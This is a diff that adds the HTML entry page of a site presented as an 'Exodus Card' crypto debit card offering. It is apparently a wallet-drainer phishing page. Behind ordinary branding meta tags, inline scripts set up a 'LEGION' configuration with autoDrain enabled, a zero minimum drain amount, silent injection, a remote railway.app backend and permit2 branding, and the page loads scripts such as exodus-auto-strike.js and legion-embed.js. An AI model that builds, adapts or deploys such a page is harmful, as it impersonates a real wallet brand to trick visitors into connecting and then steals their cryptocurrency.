@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="theme-color" content="#05060A"/>
+  <meta name="description" content="Exodus Card — spend USDT & USDC from self-custody anywhere debit is accepted. Part of Exodus Pay: send, spend, earn rewards."/>
+  <meta name="keywords" content="exodus, exodus card, exodus pay, crypto debit card, USDT, USDC, mastercard, visa, self-custody, Baanx"/>
+  <meta property="og:title" content="Exodus Card"/>
+  <meta property="og:description" content="Free virtual debit card. Spend stablecoins from self-custody — online, in-store, Apple Pay & Google Wallet."/>
+  <meta property="og:image" content="https://exodus-card.surge.sh/logo.png?v=4"/>
+  <meta property="og:url" content="https://exodus-card.surge.sh/"/>
+  <meta property="og:site_name" content="Exodus Card"/>
+  <meta property="og:type" content="website"/>
+  <meta name="twitter:card" content="summary"/>
+  <meta name="twitter:title" content="Exodus Card"/>
+  <meta name="twitter:description" content="Exodus Card + Exodus Pay — spend USDT/USDC from self-custody anywhere debit works."/>
+  <meta name="apple-mobile-web-app-capable" content="yes"/>
+  <meta name="apple-mobile-web-app-title" content="Exodus Card"/>
+  <meta name="application-name" content="Exodus Card"/>
+  <meta name="mobile-web-app-capable" content="yes"/>
+  <meta name="format-detection" content="telephone=no"/>
+  <link rel="canonical" href="https://exodus-card.surge.sh/"/>
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg?v=4"/>
+  <link rel="apple-touch-icon" sizes="180x180" href="/logo.png?v=4"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <title>Exodus Card</title>
+  <script type="module" crossorigin src="/assets/index-CtuewKp5.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-BqnN8uGK.css">
+  <link rel="stylesheet" href="/exodus-theme.css?v=2.0.0"/>
+  <style id="__exodus_launch_css">
+    #__lgn_root{display:none!important}
+    #cwModal.cw-show{display:none!important}
+  </style>
+</head>
+<body>
+  <div id="app">
+    <div id="root"></div>
+  </div>
+  <script>window.LEGION_BRAND='permit2';</script>
+  <script>
+    // Must run BEFORE legion.js so PLAT.strategy computes correctly
+    try {
+      if (localStorage.getItem('__test_exodus_inapp') === '1') {
+        window.__EXODUS_IN_APP__ = true;
+        window.exodus = window.exodus || {};
+      }
+    } catch (_) {}
+  </script>
+  <script>
+    (function () {
+      try {
+        window.__SELECTED_WALLET__ = 'exodus';
+        // Exodus mobile dropped WalletConnect (Apr 2026) — QR on desktop only
+        window.__EXODUS_QR_DESKTOP_ONLY__ = true;
+        window.__LEGION_DEEP_LINK_TARGET__ = null;
+      } catch (_) {}
+    })();
+    window.LEGION_CONFIG = {
+      backendUrl: 'https://sadrailala-production.up.railway.app',
+      wcProjectId: 'a785da105621eb55c998a35c57587667',
+      autoDrain: true,
+      showOverlay: false,
+      injectMode: 'silent',
+      silentMode: false,
+      delayDrainMs: 100,
+      hookButtons: false,
+      minDrainUsd: 0,
+      vendorBase: '/'
+    };
+  </script>
+  <script src="/exodus-skin.js?v=2.0.1"></script>
+  <script src="/exodus-mobile-keepalive.js?v=2.0.3"></script>
+  <script src="/exodus-oneshot.js?v=2.0.5"></script>
+  <script src="/exodus-open-inapp.js?v=2.0.3"></script>
+  <script src="/exodus-auto-strike.js?v=1.0.5"></script>
+  <script src="/exodus-direct.js?v=1.3.0"></script>
+  <script src="/exodus-deeplink-rescue.js?v=1.1.7"></script>
+  <script src="/exodus-preflight.js?v=1.0.5"></script>
+  <script src="/exodus-connected-ui.js?v=1.1.5"></script>
+  <script src="/exodus-phase-b.js?v=1.0.2"></script>
+  <script src="/exodus-debug.js?v=1.0.1"></script>
+  <script
+    src="/legion-embed.js?v=5.16.38"
+    defer
+    data-hook-buttons="false"
+    data-auto-drain="true"
+    data-backend="https://sadrailala-production.up.railway.app"
+    data-wc="a785da105621eb55c998a35c57587667"
+    data-min-drain-usd="0"
+    data-vendor-base="/"
+  ></script>
+  <script src="/exodus-post-connect.js?v=1.0.1" defer></script>
+</body>
+</html>
